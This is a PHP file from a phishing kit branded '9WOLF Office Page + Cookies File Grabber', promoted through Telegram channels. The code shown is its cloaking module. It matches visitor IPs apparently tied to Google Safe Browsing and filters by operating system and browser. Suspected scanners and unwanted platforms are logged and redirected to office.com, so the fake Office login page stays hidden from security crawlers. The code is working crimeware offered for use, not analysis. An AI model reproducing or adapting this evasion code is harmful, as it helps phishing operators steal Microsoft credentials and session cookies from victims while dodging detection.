<?php
//error_reporting(E_ALL ^ E_NOTICE);
/*
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡟⠁⠼⠻⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⠀⠀⠀⠸⡏⣇⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⠀⠀⠀⠀⢠⡇⢹⣀⠞⠛⢷⡄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡟⠀⠀⠀⠀⣶⣿⣥⡬⡟⠀⠀⠀⣿⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⠏⠀⠀⠀⠀⠀⢻⠈⠁⢹⡇⠀⠀⢰⡟⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠶⠛⠛⣻⠅⠀⠀⠀⠀⠀⠀⢸⣆⡴⠟⠃⠀⠀⡾⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡴⠋⡴⢿⡿⠏⠀⠀⠀⠀⠀⠀⠀⢈⣿⠁⠀⠀⠀⢰⠇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⠁⣸⣧⠽⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⢠⡆⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡟⠀⠀⣿⣿⣰⡆⠀⠀⠀⠀⠀⠀⠀⠀⡆⠀⣠⣿⡿⣦⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠀⠀⠀⠘⢻⢿⣇⡀⠀⠀⢀⠀⠀⠀⣸⠷⣿⣯⠇⠘⠽⢻⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣿⠟⠀⠀⢶⣄⠈⠇⣿⣷⠀⠀⠘⣇⠀⠀⠘⣶⠿⠀⠀⠀⠀⠸⣇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣾⠏⠀⢰⡀⢸⣿⠃⠲⠃⢻⣶⡄⣦⣿⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⢿⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣴⣟⣁⣠⣴⣿⡇⢸⡏⠀⠀⠀⠾⢹⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣷⠀⠀⠀⠀⠀
⣀⣀⣤⣴⣿⣟⠀⠉⣩⣿⡿⢡⡟⠀⠀⠀⠀⠀⠘⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣧⠀⠀⠀⠀
⠀⠉⠛⠿⢿⣿⣶⣿⣿⣯⣶⣿⣿⠇⠀⠀⠀⠀⠀⠘⠳⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠸⣆⠀⠀⠀
⠀⠀⠀⠀⠀⣼⣿⣫⠍⠙⠚⠋⣿⢀⣶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣆⠀⠀⠀⣠⠀⣷⣿⡄⠀⠀
⠀⠀⠀⠀⣼⡿⣿⡏⣸⠃⠀⠀⢸⡿⣿⡀⢀⠀⠀⠀⠀⠀⠀⠀⢦⣄⠀⠀⣿⡄⠀⢰⣿⣆⣿⠻⣧⠀⠀
⠀⠀⠀⢰⡟⢠⣿⣿⡯⠀⠀⠀⠀⠳⠸⣧⠈⣷⡀⠰⡄⠀⠀⠀⠈⣿⣇⣰⠟⣷⡄⣸⣿⠻⣿⣇⠛⠀⠀
⠀⠀⠀⠀⢠⣿⣿⣿⣿⢠⡇⠀⠀⠀⠀⠙⣷⣿⢿⣆⢹⣆⠀⠀⢰⡇⣿⠏⠀⠈⢿⣿⣿⡆⠙⢿⣦⠀⠀
⠀⠀⠀⠀⢸⣏⣿⢿⣿⡿⠀⠀⠀⠀⠀⠀⠈⠛⠄⠻⢿⡟⢷⣤⣾⠁⠁⠀⠀⠀⠀⠉⠻⣿⡄⡈⠹⣧⠀
⠀⠀⠀⠀⠈⢸⡏⣸⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠊⠻⣿⡄⠀⠀⠀⠀⠀⠀⠀⠈⡗⠹⣷⣼⡆
⠀⠀⠀⠀⠀⢸⡃⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠂⠀⠀⠀⠀⠀⠀⠀⠛⠀⣿⡿⣷
⠀⠀⠀⠀⠀⠀⠀⠙⠛⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠲⠿⠇⠉
 * //Think Twice , Code Once\\
 * //We work in the dark to serve the light\\
 * 9WOLF Office Page + Cookies File Grabber
 * Version 5
 * REMEMBER:  
 * Telegram Channel is : @NINEWOLFSTORE
 * Telegram Store is   : @NINEWOLFSTORE_bot

 * CopyRights: all reserved https://9wolf.io
###########################################
#$            @NINEWOLFSTORE             #$
#$                  Says:                #$
#$           As the Hunter exist         #$ 
#$          The victim exist too         #$  
###########################################
 ================IF AGREED=================
 ==================THEN====================
=To Be save Join Our Telegram Channel
=   @NINEWOLFSTORE
=To Be Secured Join Our Telegram Store
=   @NINEWOLFSTORE_bot

*/

if($ip == "92.23.57.168" or $ip == "96.31.1.4" or $ip == "207.96.148.8") {
$message = ("9WOLF D3cl!n3d =>  [ G00gl3 S4febr0ws!ng ] :".$_SERVER['HTTP_USER_AGENT']."\n !p : ". $ip." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
        $save=fopen("9WOLFGrabber/DiscoveredBot.txt","a+");
        fwrite($save,$message);
        fclose($save);
            header("Location: https://office.com");exit();
}

if($os == "Windows Server 2003/XP x64" and $browser == "Firefox") {
  $message = ("9WOLF D3cl!n3d =>  [ G00gl3 S4febr0ws!ng ] :".$_SERVER['HTTP_USER_AGENT']."\n !p : ". $ip." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
        $save=fopen("9WOLFGrabber/DiscoveredBot.txt","a+");
        fwrite($save,$message);
        fclose($save);
            header("Location: https://office.com");exit();
}

if($os == "Windows 7" and $browser == "Firefox") {
  $message = ("9WOLF D3cl!n3d =>  [ G00gl3 S4febr0ws!ng ] :".$_SERVER['HTTP_USER_AGENT']."\n !p : ". $ip." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
        $save=fopen("9WOLFGrabber/DiscoveredBot.txt","a+");
        fwrite($save,$message);
        fclose($save);
            header("Location: https://office.com");exit();
}

if($os == "Windows XP" and $browser == "Firefox") {
  $message = ("9WOLF D3cl!n3d =>  [ G00gl3 S4febr0ws!ng ] :".$_SERVER['HTTP_USER_AGENT']."\n !p : ". $ip." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
        $save=fopen("9WOLFGrabber/DiscoveredBot.txt","a+");
        fwrite($save,$message);
        fclose($save);
            header("Location: https://office.com");exit();
}

if($os == "Windows XP" and $browser == "Internet Explorer") {
  $message = ("9WOLF D3cl!n3d =>  [ G00gl3 S4febr0ws!ng ] :".$_SERVER['HTTP_USER_AGENT']."\n !p : ". $ip." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
        $save=fopen("9WOLFGrabber/DiscoveredBot.txt","a+");
        fwrite($save,$message);
        fclose($save);
            header("Location: https://office.com");exit();
}

if($os == "Windows XP" and $browser == "Chrome") {
  $message = ("9WOLF D3cl!n3d =>  [ G00gl3 S4febr0ws!ng ] :".$_SERVER['HTTP_USER_AGENT']."\n !p : ". $ip." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
        $save=fopen("9WOLFGrabber/DiscoveredBot.txt","a+");
        fwrite($save,$message);
        fclose($save);
            header("Location: https://office.com");exit();
}
if($os == "Windows Vista" and $browser == "Internet Explorer") {
 $message = ("9WOLF D3cl!n3d =>  [ G00gl3 S4febr0ws!ng ] :".$_SERVER['HTTP_USER_AGENT']."\n !p : ". $ip." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
        $save=fopen("9WOLFGrabber/DiscoveredBot.txt","a+");
        fwrite($save,$message);
        fclose($save);
            header("Location: https://office.com");exit();
}

if($os == "Windows Vista" or $os == "Ubuntu" or $os == "Chrome OS" or $os == "BlackBerry" or $os == "Linux") {
  $message = ("9WOLF D3cl!n3d =>  [ G00gl3 S4febr0ws!ng ] :".$_SERVER['HTTP_USER_AGENT']."\n !p : ". $ip." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
        $save=fopen("9WOLFGrabber/DiscoveredBot.txt","a+");
        fwrite($save,$message);
        fclose($save);
            header("Location: https://office.com");exit();
}

if($browser == "Unknown Browser") {
  $message = ("9WOLF D3cl!n3d =>  [ G00gl3 S4febr0ws!ng ] :".$_SERVER['HTTP_USER_AGENT']."\n !p : ". $ip." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
        $save=fopen("9WOLFGrabber/DiscoveredBot.txt","a+");
        fwrite($save,$message);
        fclose($save);
            header("Location: https://office.com");exit();
}

if($browser == "Internet Explorer") {
  $message = ("9WOLF D3cl!n3d =>  [ G00gl3 S4febr0ws!ng ] :".$_SERVER['HTTP_USER_AGENT']."\n !p : ". $ip." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
        $save=fopen("9WOLFGrabber/DiscoveredBot.txt","a+");
        fwrite($save,$message);
        fclose($save);
            header("Location: https://office.com");exit();
}

if($os == "Windows 2000") {
 $message = ("9WOLF D3cl!n3d =>  [ G00gl3 S4febr0ws!ng ] :".$_SERVER['HTTP_USER_AGENT']."\n !p : ". $ip." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
        $save=fopen("9WOLFGrabber/DiscoveredBot.txt","a+");
        fwrite($save,$message);
        fclose($save);
            header("Location: https://office.com");exit();
}

if($os == "Unknown OS Platform") {
  $message = ("9WOLF D3cl!n3d =>  [ G00gl3 S4febr0ws!ng ] :".$_SERVER['HTTP_USER_AGENT']."\n !p : ". $ip." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
        $save=fopen("9WOLFGrabber/DiscoveredBot.txt","a+");
        fwrite($save,$message);
        fclose($save);
            header("Location: https://office.com");exit();
}

if($lock_platform == "on"){
    if($os == "iPhone" or $os == "iPad" or $os == "Android" or $os == "iPod" or $os == "Mac OS X" or $os == "Mac OS 9") {
    }else{
      $message = ("9WOLF D3cl!n3d =>  [ L0ck3d Pl4tf0rm ] :".$_SERVER['HTTP_USER_AGENT']."\n !p : ". $ip." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
        $save=fopen("9WOLFGrabber/DiscoveredBot.txt","a+");
        fwrite($save,$message);
        fclose($save);
            header("Location: https://office.com");exit();
    }
}
